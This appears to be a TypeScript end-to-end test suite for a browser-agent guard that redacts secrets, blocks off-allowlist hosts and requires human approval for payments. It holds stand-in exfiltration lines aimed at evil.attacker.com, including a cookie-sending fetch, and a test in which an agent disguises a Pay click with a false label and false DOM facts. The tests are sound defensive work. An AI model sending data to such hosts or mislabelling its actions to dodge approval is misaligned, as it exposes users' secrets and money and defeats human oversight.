import { test, describe, before, after } from 'node:test';
import * as assert from 'node:assert';
import * as fs from 'node:fs';
import type * as http from 'node:http';
import { serveFixtures, closeServer, makeRig, nextApproval } from './helpers.ts';
import type { Rig } from './helpers.ts';
import type { DomFacts } from '../../src/core/types.ts';

const PORT = 4311;
const ORIGIN = `http://127.0.0.1:${PORT}`;
const PAGE = `<!doctype html><html><head><title>Fixture</title></head><body data-step="1">
<button id="pay">Pay ₹1,500 now</button>
<button id="view">View details</button>
<a id="help" href="http://evil.attacker.com/x">Help</a>
<a id="rel" href="/eligibility"><span id="relspan">Eligibility rules</span></a>
<form id="f" action="/api/save">
  <label for="pw">Password</label><input id="pw" type="password" name="pw">
  <input id="otp" name="code" autocomplete="one-time-code" aria-label="Code">
  <input id="nm" name="full_name" aria-label="Full name" value="prefilled">
  <select id="sel" name="sel"><option value="a">Alpha</option><option value="b" selected>Beta</option></select>
  <textarea id="ta" name="ta">private draft</textarea>
  <input type="submit" id="sub" value="Send">
</form>
<button class="d">X</button><button class="d">Y</button>
<script>
  window.clicks = {};
  for (const el of document.querySelectorAll('button, a, input[type=submit]')) el.addEventListener('click', (e) => { e.preventDefault(); window.clicks[el.id] = (window.clicks[el.id] || 0) + 1; });
</script></body></html>`;

let server: http.Server;
let rig: Rig;
const clicks = async (id: string): Promise<number> => rig.capture.pageForExecutor().evaluate((k) => (window as unknown as { clicks: Record<string, number> }).clicks[k] ?? 0, id);
const open = async (): Promise<void> => {
  const o = await rig.executor.execute({ id: 'nav', type: 'NAVIGATE', target: 'browser', value: `${ORIGIN}/`, humanLabel: 'open fixture' });
  assert.strictEqual(o.status, 'EXECUTED');
};

before(async () => {
  server = await serveFixtures(PORT, {
    '/': { type: 'text/html; charset=utf-8', body: PAGE },
    '/api/fail': { type: 'application/json', status: 400, body: JSON.stringify({ error: 'Field required (token SES_LEAK_123)', token: 'SES_LEAK_123' }) }
  });
  rig = await makeRig(ORIGIN, 'run_capture_e2e');
  await open();
});
after(async () => {
  await rig.capture.close();
  await closeServer(server);
  fs.rmSync(rig.dir, { recursive: true, force: true });
});

describe('Browser capture (real Chromium)', () => {
  test('browser initializes and one launch per capture is enforced', async () => {
    assert.strictEqual(rig.capture.status, 'CONNECTED');
    await assert.rejects(() => rig.capture.launch(), /one browser per capture/);
  });

  test('AI-mode accessibility snapshot works and secrets are redacted', async () => {
    await rig.capture.pageForExecutor().fill('#pw', 'hunter2'); // test harness sets a secret directly
    const { snapshot, stateHash, event } = await rig.capture.captureSnapshot('fixture');
    assert.match(snapshot.ariaSnapshot ?? '', /button "Pay ₹1,500 now" \[ref=e\d+\]/);
    assert.strictEqual(snapshot.formInputs.pw, '[REDACTED]');
    assert.strictEqual(snapshot.title, 'Fixture');
    assert.strictEqual(snapshot.step, 1);
    assert.match(stateHash, /^[0-9a-f]{64}$/);
    assert.ok(!JSON.stringify(event).includes('hunter2'));
    assert.ok(!fs.readFileSync(`${rig.dir}/run_capture_e2e.jsonl`, 'utf-8').includes('hunter2'));
  });

  test('navigation, requests and responses are recorded', () => {
    const ev = rig.recorder.events();
    assert.ok(ev.some((e) => e.type === 'BROWSER_NAVIGATED' && e.payload.url === `${ORIGIN}/`));
    assert.ok(ev.some((e) => e.type === 'NETWORK_REQUEST' && e.payload.url === `${ORIGIN}/` && e.payload.method === 'GET'));
    assert.ok(ev.some((e) => e.type === 'NETWORK_RESPONSE' && e.payload.status === 200 && e.payload.resourceType === 'document'));
  });

  test('off-allowlist requests are aborted by the route guard and never recorded as sent', async () => {
    const page = rig.capture.pageForExecutor();
    const result = await page.evaluate(() => fetch('http://evil.attacker.com/c?cookie=abc').then(() => 'sent', (e: Error) => `blocked: ${e.message}`));
    await rig.capture.flush();
    assert.match(result, /^blocked/);
    const ev = rig.recorder.events();
    assert.ok(ev.some((e) => e.type === 'NETWORK_BLOCKED' && e.payload.host === 'evil.attacker.com' && e.payload.layer === 'BROWSER_NETWORK'));
    assert.ok(!ev.some((e) => e.type === 'NETWORK_REQUEST' && String(e.payload.url).includes('evil.attacker.com')));
    assert.ok(!ev.some((e) => e.type === 'FAILURE_DETECTED' && String(e.payload.url).includes('evil.attacker.com')), 'our own block is not a request failure');
  });

  test('HTTP errors from the app are recorded as failures with only a redacted error field', async () => {
    await rig.capture.pageForExecutor().evaluate(() => fetch('/api/fail').then((r) => r.status));
    await rig.capture.flush();
    const f = rig.recorder.events().find((e) => e.type === 'FAILURE_DETECTED' && e.payload.path === '/api/fail');
    assert.ok(f);
    assert.strictEqual(f.payload.status, 400);
    assert.ok(!JSON.stringify(f).includes('SES_LEAK_123'));
  });
});

describe('DOM facts → guard → dispatch (real Chromium, P1 guard)', () => {
  test('facts are read from live elements and normalised to the DomFacts contract', async () => {
    rig.guard.calls = [];
    await rig.executor.execute({ id: 'f1', type: 'CLICK', target: '#view', humanLabel: 'view' });
    await rig.executor.execute({ id: 'f2', type: 'CLICK', target: '#relspan', humanLabel: 'eligibility' });
    await rig.executor.execute({ id: 'f3', type: 'TYPE', target: '#nm', value: 'Alex', humanLabel: 'name' });
    await rig.executor.execute({ id: 'f4', type: 'SELECT', target: '#sel', value: 'a', humanLabel: 'pick' });
    await rig.executor.execute({ id: 'f5', type: 'TYPE', target: '#ta', value: 'x', humanLabel: 'ta' });
    const dom: Record<string, DomFacts | undefined> = Object.fromEntries(rig.guard.calls.map((a) => [a.id, a.dom]));
    assert.strictEqual(dom.f3?.value, undefined, 'data-entry values are never read');
    assert.deepStrictEqual(dom.f1, { tagName: 'button', text: 'View details', inputType: 'submit', name: 'view' });
    assert.deepStrictEqual(dom.f2, { tagName: 'span', text: 'Eligibility rules', name: 'relspan', href: `${ORIGIN}/eligibility` });
    assert.deepStrictEqual(dom.f3, { tagName: 'input', ariaLabel: 'Full name', inputType: 'text', name: 'full_name', formAction: `${ORIGIN}/api/save` });
    assert.strictEqual(dom.f4?.text, 'Beta', 'select reports only the selected option label');
    assert.strictEqual(dom.f5?.text, undefined, 'textarea content is never read');
  });

  test('the guard decision is recorded before the dispatch', async () => {
    const o = await rig.executor.execute({ id: 'ord1', type: 'CLICK', target: '#view', humanLabel: 'view' });
    assert.strictEqual(o.status, 'EXECUTED');
    const ev = rig.recorder.events();
    const decided = ev.findIndex((e) => e.payload.actionId === 'ord1' && e.payload.kind === 'POLICY_DECISION');
    const dispatched = ev.findIndex((e) => e.payload.actionId === 'ord1' && e.type === 'ACTION_DISPATCHED');
    assert.ok(decided >= 0 && dispatched > decided);
  });

  test('BLOCK prevents execution: off-allowlist link and password field', async () => {
    const before = await clicks('help');
    const link = await rig.executor.execute({ id: 'b1', type: 'CLICK', target: '#help', humanLabel: 'Open help' });
    assert.strictEqual(link.status, 'BLOCKED');
    assert.strictEqual(await clicks('help'), before);
    await rig.capture.pageForExecutor().fill('#pw', '');
    const pw = await rig.executor.execute({ id: 'b2', type: 'TYPE', target: '#field-opaque, #pw', value: 'hunter2', humanLabel: 'Fill comments' });
    assert.strictEqual(pw.status, 'BLOCKED');
    assert.strictEqual(await rig.capture.pageForExecutor().inputValue('#pw'), '');
    const otp = await rig.executor.execute({ id: 'b3', type: 'TYPE', target: '#otp', value: '123456', humanLabel: 'Fill code' });
    assert.strictEqual(otp.status, 'BLOCKED');
    assert.ok(!JSON.stringify(rig.recorder.events()).includes('hunter2'));
  });

  test('agent-supplied DOM facts are ignored: a disguised Pay click still needs approval', async () => {
    rig.guard.calls = [];
    const pending = rig.executor.execute({ id: 's1', type: 'CLICK', target: '#pay', humanLabel: 'View fee details', dom: { tagName: 'button', text: 'View' } });
    const id = await nextApproval(rig.gate);
    assert.strictEqual(rig.guard.calls[0].dom?.text, 'Pay ₹1,500 now');
    assert.strictEqual(await clicks('pay'), 0, 'nothing dispatched while awaiting approval');
    rig.gate.resolve(id, false, 'tester');
    const o = await pending;
    assert.strictEqual(o.status, 'DENIED');
    assert.strictEqual(await clicks('pay'), 0, 'denial cancels execution');
  });

  test('approval executes the revalidated action exactly once', async () => {
    const pending = rig.executor.execute({ id: 's2', type: 'CLICK', target: '#pay', humanLabel: 'Pay' });
    const id = await nextApproval(rig.gate);
    rig.gate.resolve(id, true, 'tester');
    const o = await pending;
    assert.strictEqual(o.status, 'EXECUTED');
    assert.strictEqual(await clicks('pay'), 1);
    assert.ok(o.events.some((e) => e.payload.phase === 'POST_APPROVAL_REVALIDATION'));
    assert.strictEqual(rig.gate.resolve(id, true, 'tester'), false, 'an approval cannot be reused');
  });

  test('approval does not transfer to a changed element', async () => {
    const pending = rig.executor.execute({ id: 's3', type: 'CLICK', target: '#pay', humanLabel: 'Pay' });
    const id = await nextApproval(rig.gate);
    await rig.capture.pageForExecutor().evaluate(() => { document.getElementById('pay')!.textContent = 'Pay ₹99,999 now'; });
    rig.gate.resolve(id, true, 'tester');
    const o = await pending;
    assert.strictEqual(o.status, 'CANCELLED');
    assert.strictEqual(await clicks('pay'), 1, 'count unchanged from previous test');
  });

  test('ambiguous or missing targets fail closed before the guard is consulted', async () => {
    rig.guard.calls = [];
    assert.strictEqual((await rig.executor.execute({ id: 'x1', type: 'CLICK', target: '.d', humanLabel: 'x' })).status, 'FAILED');
    assert.strictEqual((await rig.executor.execute({ id: 'x2', type: 'CLICK', target: '#missing', humanLabel: 'x' })).status, 'FAILED');
    assert.strictEqual((await rig.executor.execute({ id: 'x3', type: 'REAUTHENTICATE', target: '/api/session/refresh', humanLabel: 'x' })).status, 'FAILED');
    assert.strictEqual(rig.guard.calls.length, 0);
  });

  test('navigation to a non-allowlisted URL is blocked by the action guard', async () => {
    const o = await rig.executor.execute({ id: 'n1', type: 'NAVIGATE', target: 'browser', value: 'http://evil.attacker.com/steal', humanLabel: 'Open reference' });
    assert.strictEqual(o.status, 'BLOCKED');
    assert.strictEqual(rig.capture.pageForExecutor().url(), `${ORIGIN}/`);
  });

  test('close releases the browser', async () => {
    await rig.capture.close();
    assert.strictEqual(rig.capture.status, 'CLOSED');
    assert.throws(() => rig.capture.pageForExecutor());
    const o = await rig.executor.execute({ id: 'z', type: 'CLICK', target: '#view', humanLabel: 'x' });
    assert.strictEqual(o.status, 'FAILED');
  });
});
